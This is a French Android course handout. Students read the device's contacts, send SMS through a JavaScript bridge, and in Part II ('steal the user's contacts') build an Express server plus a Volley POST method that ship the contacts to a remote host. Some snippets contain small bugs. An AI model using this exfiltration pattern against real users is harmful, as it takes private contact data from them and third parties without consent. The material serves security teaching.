# Documentation pour TD2

## Partie I: Implémenter un carnet d'adresses
### Création d'une classe Contact
- Dans `Java`, créer une classe `Contact` contenant deux Strings pour le nom et le numéro de téléphone avec la méthode contructeur, ainsi que tous les getters et setters nécessaires.

### Récupération des contacts - exemple

- Avant de commencer, il est important de créer un jeu de données en ajoutant quelques contacts avec leurs numéros de téléphones.
- Pour récupérer les contacts de l'utilisateur, le code suivant vous est fourni, ce dernier retourne le nom et le numéro de téléphone du premier contact. Il vous est demandé d'utiliser le code suivant et de m'enrichir afin de créer une méthode dana la classe `WebAppInterface` qui renvoie la liste des contacts récupérée.

```Java
// Définir un curseur qui va parcourir les contacts, le carnet d'adresses d'android se présente comme un tableau ayant multiples colonnes
Cursor cursor = mContext.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);

String name, number; 
// Création d'une ArrayList de contacts
ArrayList<Contact> contacts = new ArrayList<Contact>();

// Tester si le curseur peut avancer
if (cursor.moveToNext())
{
    // retourne le nom du contact dans lequel se situe le curseur
    @SuppressLint("Range") name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));

    // retourne le numéro de téléphone du contact dans lequel se situe le curseur
    @SuppressLint("Range") number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
}

//Ajouter le contact récupéré dans l'ArrayList
contacts.add(new Contact(name,number));

// Fermer le curseur, cette commande est obligatoire
cursor.close();
```

### Passage d'une structure de données Java vers un String Json avec la classe GSON 

- Pour réaliser cette transformation `ArrayList to JSON`, la classe GSON qui est contenue dans le jar téléchargeable dans le lien suivant est utilisée. 
https://jar-download.com/artifacts/com.google.code.gson/gson/2.8.7

- Pour ajouter le jar dans le projet `Android`, il faut se mettre sur la vue `Project` dans l'explorateur de fichiers d'Android Studio. Ensuite, il faut glisser le JAR dans le fichier libs qui se trouve dans l'arborescence `nomDuProject/app/libs`. Après, aller dans `File -> Project Structure... -> Dependencies -> + (Add dependency) -> JAR -> et préciser son chemin "libs/lenomDuJar.jar". Un tutoriel illustrant cela est disponible sur le lien suivant :
[https://www.tutorialkart.com/kotlin-android/add-external-jar-to-library-in-android-studio/](https://www.tutorialkart.com/kotlin-android/add-external-jar-to-library-in-android-studio/)

- La transformation est effectuée à l'aide de la méthode toJSON() comme suit. 

```Java
String donnéesJson = new GSON().toJson(uneArrayList);
```

### Format de la fonction JavaScript qui récupère puis affiche les contacts
```Javascript
// Appel à la méthode JAVA qui retourne les contacts, ces contacts sont sous format JSON

// Parser les contacts JSON pour obtenir un tableau manipulable en JS

// Afficher les différents contacts à l'aide d'un tableau HTML

// Rendre le tableau HTML interactif avec l'ajout de la fonction onClick pour chaque ligne du tableau
```


### Afficher les contacts depuis JavaScript
- Après avoir fait appel à la méthode qui renvoie les contacts depuis Javascript via l'instance de `WebAppInterface` qui nous avons nommé `Android`, il est nécessaire de passer du format `JSON` vers un format `Javascript Object` comme l'exemple le montre : 

```Javascript
// Appel à la méthode qui retourne tous les contacts sous format JSON et récupération des contacts dans la variable jsonContacts
var jsonContacts = Android.getAllContacts();

// Parser les contacts JSON en Object en utilisant la méthode JSON.parse() prédéfinie dans JavaScript
var contacts = JSON.parse(jsonContacts);
```

### Afficher un contact sous format HTML (Tableau)
- Pour se faire, il faut d'abord créer un tableau HTML vide que l'on lui associe un `id` pour pouvoir modifier son contenu par la suite.

Dans le fichier HTML :
```HTML
<table class="table table-stripped" id="table" border="2"> 
		<thead>
			<tr><th> Nom </th> <th> Numéro </th></tr>
		</thead>
		<tbody id="contacts">
				
		</tbody>
</table>
```

Dans la fonction JS qui récupère et affiche les contacts :
```JavaScript
// Création d'une variable qui contiendra le contenu du tableau
var tableContent = "";

var i = 0; // le i est la position du prémier contact dans le tableau de contacts
tableContent += "<tr>"; // Nouvelle ligne HTML
tableContent += "<td>" + contacts[i].name + "</td>" + "<td>" + contacts[i].number + "</td>";
tableContent += "</tr>"; // Fin de la nouvelle ligne HTML

// remplacer le contenu du tableau par le contenu de la variable tableContent
document.getElementById("contacts").innerHTML = tableContent;
```
### Ajouter la fonction onClick pour chaque ligne du tableau, et qui récupère le contenu de la ligne
- Dans la même fonction JavaScript qui récupère puis affiche les contacts, rajouter le script suivant :

```JavaScript
var table = document.getElementById("table"),rIndex;
		for (var i = 0 ; i< table.rows.length ; i++)
		{
			table.rows[i].onclick = function()
			{
				rIndex = this.rowsIndex;
                // Pour récupérer le nom du contact sélectionnée
				[un textArea ou un textField] = this.cells[0].innerHTML; 
				// mettre le numéro du contact sélectionné dans le text Area "textArea"
                document.getElementById("textArea").value = this.cells[1].innerHTML;
			}
		}
```

### Envoyer un sms à un contact sélectionné 
- Pour créer ce Brigde, il est nécessaire de créer une méthode `Java` dans la classe `WebAppInterface`, puis une fonction JavaScript qui fait appel à cette méthode via l'instance de `WebAppInterface` que l'on a nommé `Android`.

Code Java pour l'envoi d'un SMS à un numéro donné :
```Java
public void sendSMS(String number, String content)
{
    SmsManager smsManager = SmsManager.getDefault();
    smsManager.sendTextMessage(number, null, content, null, null);
}
```

### Être notifié quand l'SMS est envoyé/reçu
Pour se faire, il faut créer un `intentFilter` pour chaque notification (envoi ou réception) comme suit:
```Java
mContext.registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Log.d("SMS ", "sent");
            }
        }, new IntentFilter("SMS_SENT_ACTION"));

        mContext.registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Log.d("SMS ", "delivered");
            }
        }, new IntentFilter("SMS_DELIVERED_ACTION"));
```

Ces filtres sont ensuite utilisés lors de la création des intents d'envoi et de réception comme suit :
```Java
		PendingIntent sentIntent = PendingIntent.getBroadcast(mContext, 100, new Intent("SMS_SENT_ACTION"), 0);
        PendingIntent deliveryIntent = PendingIntent.getBroadcast(mContext, 200, new Intent("SMS_DELIVERED_ACTION"), 0);
```

## Partie II: Voler les contacts de l'utilisateur
Dans cette partie, il vous est demandé de créer un serveur avec `NodeJS`. Ce dernier devra être en mesure de :
1. Reçevoir des requêtes `HTTP` 
2. Agir correctement en fontion de la requête qui lui est envoyée
3. Parser le contenu de la requête
4. enregistrer les contacts dans un fichier txt ou json de la machine exécutant le serveur.
5. Renvoyer une erreur si le contenu de la requête n'est pas au format souhaité

- Afin de reçevoir les contacts sous format `JSON`, il faut utiliser Express JS. La documentation est disponible ici :
[https://expressjs.com/fr/guide/routing.html](https://expressjs.com/fr/guide/routing.html)

### Mise en place d'un serveur NodeJS avec Express
Dans cette partie, on aura principalement besoin de gérer deux types de requêtes : `GET` et `POST`. Chaque requête devra actionner une fonction qui prend comme paramètre deux attributs, par convention req pour `Request` et res pour `Result`.

```NodeJS
const bodyParser = require("body-parser");
const express = require("express");
const app = express();
const fs = require('fs');

app.use(express.json());
app.use(bodyParser.urlencoded({extended: true}));

// Routage de la page d'accueil en renvoyant "welcome page!"
app.get('/', (req, res) => {
    res.send('welcome page!')
});

// Routage de la page [adresse vers le serveur]/contacts en récupérant le corp de la requête
app.post('/contacts', (req, res) => {
    var requete = req.body
}
```

### Envoi d'une requête HTTP depuis Android avec Andoid Volley
La méthode suivante est utilisée pour envoyer une requête `GET`
```Java
   @JavascriptInterface
    public String getRequest(String url) throws IOException {
        final String[] result = "";
        // Instantiate the RequestQueue.
        RequestQueue queue = Volley.newRequestQueue(mContext);
        // Request a string response from the provided URL.
        StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // Display the first 500 characters of the response string.
                        System.out.println("Response is: "+ response);
                        result[0] = response;

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                System.out.println("That didn't work!");
                System.out.println("Erreur " + error.toString());
            }
        });
        // Add the request to the RequestQueue.
        queue.add(stringRequest);
    return  result[0];
    }
```

La méthode suivante est utilisée pour envoyer une requête `POST`
```Java
@JavascriptInterface
    public void postStringRequest(String URL, String informationsJson)
    {
            RequestQueue requestQueue = Volley.newRequestQueue(mContext);
            final String requestBody = informationsJson;

            StringRequest stringRequest = new StringRequest(Request.Method.POST, URL, new Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
                    Log.i("VOLLEY Response ", response);
                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    Log.e("VOLLEY Error", error.toString());
                }
            }) {
                @Override
                protected Response<String> parseNetworkResponse(NetworkResponse response) {
                    String responseString = "";
                    if (response != null) {
                        responseString = String.valueOf(response.statusCode);
                        // can get more details such as response.headers
                    }
                    return Response.success(responseString, HttpHeaderParser.parseCacheHeaders(response));
                }
            };

            requestQueue.add(stringRequest);
    }

```

### URL
